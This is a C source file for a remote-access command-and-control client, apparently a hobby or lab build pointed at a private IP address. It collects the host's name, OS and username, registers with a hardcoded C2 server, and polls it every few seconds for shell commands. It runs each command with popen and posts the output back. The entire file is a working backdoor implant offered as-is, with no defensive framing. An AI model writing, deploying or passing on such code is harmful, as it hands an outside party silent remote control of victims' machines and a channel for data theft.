#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/utsname.h> // for uname 
#include <pwd.h> // current working directory 
#include <curl/curl.h>
#include <uuid/uuid.h>
#include <sys/stat.h> // for mkdir , stat 
#include <dirent.h>
#include <jansson.h> // working with json type shi 
#include <time.h>

//  just some predfined configs 
#define C2_SERVER "http://192.168.1.37:5000"
#define HEARTBEAT_INTERVAL 5
#define MAX_RETRIES 3
#define CONFIG_DIR "/.demo_client"
#define CONFIG_FILE "config.json"
#define MAX_COMMAND_LENGTH 4096
#define MAX_RESULT_LENGTH 65536
#define MAX_FAILURES 10

typedef struct {
    char *client_id;
    char *hostname;
    char *os_info;
    char *username;
    char *config_path;
    CURL *curl;
} Client; // struct named client which has every info about the client and shi 

// Structure to hold HTTP response data
struct MemoryStruct {
    char *memory;
    size_t size;
};

// Callback function for libcurl to write response data
static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if(!ptr) {
        printf("Not enough memory (realloc returned NULL)\n");
        return 0;
    }

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}

// Initialize client
void client_init(Client *client) {
    client->client_id = NULL;
    client->hostname = NULL;
    client->os_info = NULL;
    client->username = NULL;
    client->config_path = NULL;
    client->curl = curl_easy_init();

    // Get hostname
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname))) {
        perror("gethostname");
        hostname[0] = '\0';
    }
    client->hostname = strdup(hostname);

    // Get OS info
    struct utsname uts;
    if (uname(&uts)) {
        perror("uname");
        client->os_info = strdup("Unknown OS");
    } else {
        char os_info[512];
        snprintf(os_info, sizeof(os_info), "%s %s", uts.sysname, uts.release);
        client->os_info = strdup(os_info);
    }

    // Get username
    struct passwd *pw = getpwuid(getuid());
    if (pw) {
        client->username = strdup(pw->pw_name);
    } else {
        perror("getpwuid");
        client->username = strdup("unknown");
    }

    // Set config path
    const char *home = getenv("HOME");
    if (!home) home = "/";
    
    client->config_path = malloc(strlen(home) + strlen(CONFIG_DIR) + 1);
    strcpy(client->config_path, home);
    strcat(client->config_path, CONFIG_DIR);

    // Create config directory if it doesn't exist
    struct stat st = {0};
    if (stat(client->config_path, &st) == -1) {
        mkdir(client->config_path, 0700);
    }
}

// Free client resources
void client_cleanup(Client *client) {
    if (client->client_id) free(client->client_id);
    if (client->hostname) free(client->hostname);
    if (client->os_info) free(client->os_info);
    if (client->username) free(client->username);
    if (client->config_path) free(client->config_path);
    if (client->curl) curl_easy_cleanup(client->curl);
}

// Load client ID from config file
void load_client_id(Client *client) {
    char config_file[1024];
    snprintf(config_file, sizeof(config_file), "%s/%s", client->config_path, CONFIG_FILE);

    FILE *fp = fopen(config_file, "r");
    if (!fp) return;

    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    char *json_str = malloc(fsize + 1);
    fread(json_str, 1, fsize, fp);
    fclose(fp);
    json_str[fsize] = 0;

    json_error_t error;
    json_t *root = json_loads(json_str, 0, &error);
    free(json_str);

    if (!root) {
        fprintf(stderr, "Error parsing JSON: %s\n", error.text);
        return;
    }

    json_t *client_id = json_object_get(root, "client_id");
    if (json_is_string(client_id)) {
        client->client_id = strdup(json_string_value(client_id));
        printf("Loaded existing client ID: %s\n", client->client_id);
    }

    json_decref(root);
}

// Save client ID to config file
void save_client_id(Client *client) {
    if (!client->client_id) return;

    char config_file[1024];
    snprintf(config_file, sizeof(config_file), "%s/%s", client->config_path, CONFIG_FILE);

    json_t *root = json_object();
    json_object_set_new(root, "client_id", json_string(client->client_id));

    char *json_str = json_dumps(root, JSON_INDENT(2));
    json_decref(root);

    FILE *fp = fopen(config_file, "w");
    if (!fp) {
        perror("fopen");
        free(json_str);
        return;
    }

    fputs(json_str, fp);
    fclose(fp);
    free(json_str);
}

// Perform HTTP POST request with JSON data
char *http_post(Client *client, const char *url, const char *json_data) {
    if (!client->curl) {
        fprintf(stderr, "CURL not initialized\n");
        return NULL;
    }

    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;

    curl_easy_setopt(client->curl, CURLOPT_URL, url);
    curl_easy_setopt(client->curl, CURLOPT_POST, 1L);
    curl_easy_setopt(client->curl, CURLOPT_POSTFIELDS, json_data);
    curl_easy_setopt(client->curl, CURLOPT_POSTFIELDSIZE, strlen(json_data));
    curl_easy_setopt(client->curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(client->curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(client->curl, CURLOPT_USERAGENT, "C2 Client");
    curl_easy_setopt(client->curl, CURLOPT_HTTPHEADER, 
        curl_slist_append(NULL, "Content-Type: application/json"));

    CURLcode res = curl_easy_perform(client->curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        free(chunk.memory);
        return NULL;
    }

    long http_code = 0;
    curl_easy_getinfo(client->curl, CURLINFO_RESPONSE_CODE, &http_code);
    if (http_code != 200) {
        fprintf(stderr, "HTTP request failed with code %ld\n", http_code);
        free(chunk.memory);
        return NULL;
    }

    return chunk.memory;
}

// Register with the C2 server
int register_client(Client *client) {
    if (client->client_id) return 1;

    for (int retry = 0; retry < MAX_RETRIES; retry++) {
        printf("Attempting to register with server at %s/api/register (Attempt %d)\n", 
               C2_SERVER, retry + 1);

        json_t *root = json_object();
        json_object_set_new(root, "hostname", json_string(client->hostname));
        json_object_set_new(root, "os_info", json_string(client->os_info));
        json_object_set_new(root, "username", json_string(client->username));

        char *json_str = json_dumps(root, 0);
        json_decref(root);

        char url[256];
        snprintf(url, sizeof(url), "%s/api/register", C2_SERVER);

        char *response = http_post(client, url, json_str);
        free(json_str);

        if (response) {
            json_error_t error;
            json_t *resp_root = json_loads(response, 0, &error);
            free(response);

            if (resp_root) {
                json_t *client_id = json_object_get(resp_root, "client_id");
                if (json_is_string(client_id)) {
                    client->client_id = strdup(json_string_value(client_id));
                    printf("Registered with server. Client ID: %s\n", client->client_id);
                    save_client_id(client);
                    json_decref(resp_root);
                    return 1;
                }
                json_decref(resp_root);
            } else {
                fprintf(stderr, "Error parsing response JSON: %s\n", error.text);
            }
        }

        printf("Registration failed, retrying in 2 seconds...\n");
        sleep(2);
    }

    printf("Failed to register after maximum retries\n");
    return 0;
}

// Execute a command and return the output
char *execute_command(const char *command) {
    FILE *fp = popen(command, "r");
    if (!fp) {
        return strdup("Failed to execute command");
    }

    char *result = malloc(MAX_RESULT_LENGTH);
    result[0] = '\0'; // Initialize empty string
    size_t total_read = 0;
    char buffer[1024];

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        size_t len = strlen(buffer);
        if (total_read + len >= MAX_RESULT_LENGTH - 1) {
            strcat(result, "... (output truncated)");
            break;
        }
        strcat(result, buffer);
        total_read += len;
    }

    int status = pclose(fp);
    if (status != 0) {
        char status_msg[256];
        snprintf(status_msg, sizeof(status_msg), "\nExit code: %d", status);
        strcat(result, status_msg);
    }

    if (strlen(result) == 0) {
        free(result);
        return strdup("(Command executed successfully but returned no output)");
    }

    return result;
}

// Send command result back to the C2 server
int send_result(Client *client, const char *command_id, const char *result) {
    char url[256];
    snprintf(url, sizeof(url), "%s/api/command_result/%s", C2_SERVER, client->client_id);

    json_t *root = json_object();
    json_object_set_new(root, "command_id", json_string(command_id));
    json_object_set_new(root, "result", json_string(result));

    char *json_str = json_dumps(root, 0);
    json_decref(root);

    printf("Sending result for command %s\n", command_id);
    char *response = http_post(client, url, json_str);
    free(json_str);

    if (response) {
        printf("Successfully sent result to server\n");
        free(response);
        return 1;
    }

    return 0;
}

// Process heartbeat and get commands
void process_heartbeat(Client *client) {
    if (!client->client_id && !register_client(client)) {
        return;
    }

    char url[256];
    snprintf(url, sizeof(url), "%s/api/heartbeat/%s", C2_SERVER, client->client_id);

    printf("Sending heartbeat to %s\n", url);
    char *response = http_post(client, url, "{}");

    if (!response) {
        printf("Heartbeat failed\n");
        return;
    }

    json_error_t error;
    json_t *root = json_loads(response, 0, &error);
    free(response);

    if (!root) {
        fprintf(stderr, "Error parsing response JSON: %s\n", error.text);
        return;
    }

    json_t *status = json_object_get(root, "status");
    if (!json_is_string(status)) {
        fprintf(stderr, "Invalid response format: missing status\n");
        json_decref(root);
        return;
    }

    if (strcmp(json_string_value(status), "ok") == 0) {
        json_t *commands = json_object_get(root, "commands");
        if (json_is_array(commands)) {
            size_t index;
            json_t *value;
            printf("Received %zu commands from server\n", json_array_size(commands));

            json_array_foreach(commands, index, value) {
                json_t *cmd_id = json_object_get(value, "id");
                json_t *cmd = json_object_get(value, "command");

                if (json_is_string(cmd_id) && json_is_string(cmd)) {
                    printf("Executing command ID %s: %s\n", 
                           json_string_value(cmd_id), json_string_value(cmd));

                    char *result = execute_command(json_string_value(cmd));
                    if (result) {
                        for (int retry = 0; retry < MAX_RETRIES; retry++) {
                            if (send_result(client, json_string_value(cmd_id), result)) {
                                break;
                            }
                            sleep(1);
                        }
                        free(result);
                    }
                }
            }
        }
    } else {
        json_t *message = json_object_get(root, "message");
        if (json_is_string(message)) {
            printf("Heartbeat error: %s\n", json_string_value(message));
            if (strcmp(json_string_value(message), "Client not found") == 0) {
                free(client->client_id);
                client->client_id = NULL;
                register_client(client);
            }
        }
    }

    json_decref(root);
}

// Main client loop
void run_client(Client *client) {
    printf("Starting client...\n");

    if (!register_client(client)) {
        printf("Failed to register with server. Retrying in 30 seconds...\n");
        sleep(30);
        if (!register_client(client)) {
            printf("Failed to register after retry. Exiting.\n");
            return;
        }
    }

    int failure_count = 0;

    while (1) {
        process_heartbeat(client);
        failure_count = 0; // Reset on successful heartbeat

        sleep(HEARTBEAT_INTERVAL);
    }
}

int main() {
    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);

    Client client;
    client_init(&client);
    load_client_id(&client);

    run_client(&client);

    client_cleanup(&client);
    curl_global_cleanup();

    return 0;
}
